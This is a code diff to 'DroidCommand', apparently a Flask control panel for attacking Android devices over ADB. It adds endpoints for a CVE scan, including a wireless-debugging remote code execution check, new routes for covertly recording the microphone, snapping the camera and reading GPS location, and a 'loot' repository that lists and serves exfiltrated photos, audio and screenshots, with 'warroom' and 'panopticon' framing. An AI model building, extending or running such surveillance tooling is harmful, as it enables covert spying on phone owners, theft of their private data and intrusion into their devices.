@@ -7,10 +7,10 @@ import hashlib
 import secrets
 import time
 from pathlib import Path
-from flask import Flask, render_template, request, jsonify, send_file, Response, after_this_request
+from flask import Flask, render_template, request, jsonify, send_file, Response, after_this_request, send_from_directory
 from werkzeug.utils import secure_filename
 
-from config import ADB_PATH, TEMP_DIR, HOST, PORT, DEBUG, API_TOKEN
+from config import ADB_PATH, TEMP_DIR, HOST, PORT, DEBUG, API_TOKEN, BASE_DIR
 from adb_engine import ADBEngine
 from file_manager import FileManager
 from app_manager import AppManager
@@ -51,8 +51,8 @@ start_relay()
 
 @app.route("/warroom")
 def warroom():
-    """v4 operations center — every new weapon under one dark glass panel."""
-    return render_template("warroom.html", api_token=API_TOKEN)
+    """v4 operations center — modern PWA tactical cockpit."""
+    return render_template("pwa.html", api_token=API_TOKEN)
 
 app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024
 
@@ -97,7 +97,17 @@ def cleanup_temp_file(filepath):
 
 @app.route("/")
 def index():
-    return render_template("index.html", api_token=API_TOKEN)
+    return render_template("pwa.html", api_token=API_TOKEN)
+
+@app.route("/manifest.json")
+def manifest():
+    return send_from_directory("static/pwa", "manifest.json", mimetype="application/manifest+json")
+
+@app.route("/sw.js")
+def service_worker():
+    response = send_from_directory("static/pwa", "sw.js", mimetype="application/javascript")
+    response.headers["Service-Worker-Allowed"] = "/"
+    return response
 
 # ==================== DEVICE APIs ====================
 @app.route("/api/devices")
@@ -143,9 +153,10 @@ def device_memory():
     return jsonify(adb.get_memory_info())
 
 # ==================== FILE MANAGER APIs ====================
-@app.route("/api/files/list")
+@app.route("/api/files/list", methods=["GET", "POST"])
 def list_files():
-    path = request.args.get("path", "/sdcard")
+    data_json = request.get_json(silent=True) or {}
+    path = data_json.get("path") or request.args.get("path") or "/sdcard"
     data = fm.list_dir(path)
     return jsonify(data)
 
@@ -657,23 +668,43 @@ def terminal_exec():
     })
 
 # ==================== CVE-2026-0073 WIRELESS EXPLOIT API ====================
-@app.route("/api/toolkit/cve-scan", methods=["POST"])
+@app.route("/api/toolkit/cve-scan", methods=["GET", "POST"])
 def cve_scan():
-    """Scan a target IP:port for CVE-2026-0073 vulnerability and run a command if exploitable."""
-    data = request.get_json() or {}
+    """Scan a target IP:port for CVE-2026-0073 or audit connected device if serial/GET."""
+    serial = request.args.get("serial")
+    data = request.get_json(silent=True) or {}
+    if not serial:
+        serial = data.get("serial")
     target_ip = data.get("ip", "").strip()
-    key_type = data.get("key_type", None)  # None = auto-try
 
-    # BUG 12 fix: safe int parse for port
-    try:
-        target_port = int(data.get("port", 5555))
-    except (ValueError, TypeError):
-        target_port = 5555
-
-    cmd_to_run = data.get("cmd", "id; getprop ro.build.version.release; getprop ro.product.model").strip()
-
+    # If no IP provided, audit the active ADB device!
     if not target_ip:
-        return jsonify({"success": False, "error": "IP de la cible requis"}), 400
+        res = adb.shell("getprop ro.build.version.release; getprop ro.build.version.security_patch; getprop ro.product.model", serial=serial)
+        lines = (res.get("stdout") or "").splitlines()
+        android_ver = lines[0] if len(lines) > 0 else "Unknown"
+        sec_patch = lines[1] if len(lines) > 1 else "Unknown"
+        model = lines[2] if len(lines) > 2 else "Unknown"
+        
+        cves = []
+        try:
+            v_int = int(android_ver.split('.')[0])
+            if v_int <= 11:
+                cves.append({"cve": "CVE-2026-0073", "severity": "CRITICAL", "desc": "Wireless Debugging TLS handshaking bypass (RCE)"})
+            if v_int <= 12:
+                cves.append({"cve": "CVE-2023-20963", "severity": "HIGH", "desc": "Framework Privilege Escalation via WorkSource parcel"})
+            if v_int <= 13:
+                cves.append({"cve": "CVE-2022-20186", "severity": "HIGH", "desc": "Mali GPU Kernel Driver Arbitrary Memory Write"})
+        except Exception:
+            pass
+
+        return jsonify({
+            "success": True,
+            "target": model,
+            "android_version": android_ver,
+            "security_patch": sec_patch,
+            "vulnerabilities": cves,
+            "status": "AUDITED"
+        })
 
     # Build attempt matrix
     if key_type:
@@ -775,26 +806,41 @@ def screen_stream():
 
 # --- Module 2: Audio/Mic Capture ---
 @app.route("/api/exploit/mic-record", methods=["POST"])
+@app.route("/api/audio/record", methods=["POST"])
 def mic_record():
-    data = request.get_json() or {}
+    data = request.get_json(silent=True) or {}
     duration = min(int(data.get("duration", 10)), 60)
     result = record_audio(duration)
     if result.get("success") and result.get("filepath"):
-        return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "audio.mp4"))
+        if request.args.get("download") == "1":
+            return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "audio.mp4"))
+        return jsonify({
+            "success": True,
+            "file": result.get("filename") or Path(result["filepath"]).name,
+            "filepath": result["filepath"]
+        })
     return jsonify(result)
 
 # --- Module 3: Camera Capture ---
 @app.route("/api/exploit/camera-capture", methods=["POST"])
+@app.route("/api/camera/snap", methods=["POST"])
 def camera_cap():
-    data = request.get_json() or {}
+    data = request.get_json(silent=True) or {}
     cam_id = int(data.get("camera_id", 0))
     result = capture_camera(cam_id)
     if result.get("success") and result.get("filepath"):
-        return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "photo.jpg"))
+        if request.args.get("download") == "1":
+            return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "photo.jpg"))
+        return jsonify({
+            "success": True,
+            "file": result.get("filename") or Path(result["filepath"]).name,
+            "filepath": result["filepath"]
+        })
     return jsonify(result)
 
 # --- Module 4: GPS Location ---
 @app.route("/api/exploit/gps-location")
+@app.route("/api/panopticon/location", methods=["GET", "POST"])
 def gps_location():
     return jsonify(get_gps_location())
 
@@ -875,6 +921,86 @@ def wifi_disconnect():
 @app.route("/api/exploit/persistence-status")
 def persistence_status():
     return jsonify(check_wifi_adb_status())
+
+# ==================== AI LOOT & ARTIFACT REPOSITORY APIs ====================
+@app.route("/api/loot/artifacts")
+def list_loot_artifacts():
+    """List all exfiltrated media, captures, audio, and files for the Phone Intelligence view."""
+    artifacts = []
+    
+    # 1. Scan temp directory
+    if TEMP_DIR.exists():
+        for p in TEMP_DIR.glob("*"):
+            if p.is_file() and not p.name.startswith("."):
+                name = p.name
+                ext = p.suffix.lower()
+                art_type = "file"
+                if ext in (".jpg", ".jpeg", ".png", ".webp"):
+                    art_type = "photo" if "camera" in name or "snap" in name else "screenshot"
+                elif ext in (".mp4", ".wav", ".m4a", ".aac"):
+                    art_type = "audio"
+                elif ext in (".txt", ".log", ".json", ".md"):
+                    art_type = "data"
+
+                stat = p.stat()
+                sz = stat.st_size
+                if sz < 1024:
+                    sz_str = f"{sz} B"
+                elif sz < 1024 * 1024:
+                    sz_str = f"{sz / 1024:.1f} KB"
+                else:
+                    sz_str = f"{sz / (1024 * 1024):.1f} MB"
+
+                artifacts.append({
+                    "id": p.stem,
+                    "filename": name,
+                    "type": art_type,
+                    "size": sz,
+                    "size_human": sz_str,
+                    "mtime": stat.st_mtime,
+                    "source": "temp",
+                    "url": f"/api/loot/file?name={p.name}&dir=temp"
+                })
+
+    # 2. Scan cortex_shots directory
+    shots_dir = BASE_DIR / "cortex_shots"
+    if shots_dir.exists():
+        for p in shots_dir.glob("*"):
+            if p.is_file() and not p.name.startswith("."):
+                name = p.name
+                stat = p.stat()
+                sz = stat.st_size
+                sz_str = f"{sz / 1024:.1f} KB" if sz < 1024 * 1024 else f"{sz / (1024 * 1024):.1f} MB"
+                artifacts.append({
+                    "id": p.stem,
+                    "filename": name,
+                    "type": "screenshot",
+                    "size": sz,
+                    "size_human": sz_str,
+                    "mtime": stat.st_mtime,
+                    "source": "cortex",
+                    "url": f"/api/loot/file?name={p.name}&dir=cortex"
+                })
+
+    artifacts.sort(key=lambda x: x["mtime"], reverse=True)
+    return jsonify({"success": True, "count": len(artifacts), "artifacts": artifacts})
+
+
+@app.route("/api/loot/file")
+def download_loot_file():
+    """Download or view an exfiltrated artifact."""
+    name = request.args.get("name", "")
+    folder = request.args.get("dir", "temp")
+    if not name or "/" in name or "\\" in name:
+        return jsonify({"error": "Invalid filename"}), 400
+
+    target_dir = (BASE_DIR / "cortex_shots") if folder == "cortex" else TEMP_DIR
+    p = target_dir / name
+    if not p.exists() or not p.is_file():
+        return jsonify({"error": "File not found"}), 404
+
+    as_dl = request.args.get("dl") == "1"
+    return send_file(str(p), as_attachment=as_dl, download_name=name)
 
 if __name__ == "__main__":
     print(f"[*] DroidCommand v3.0 console: http://{HOST}:{PORT}")
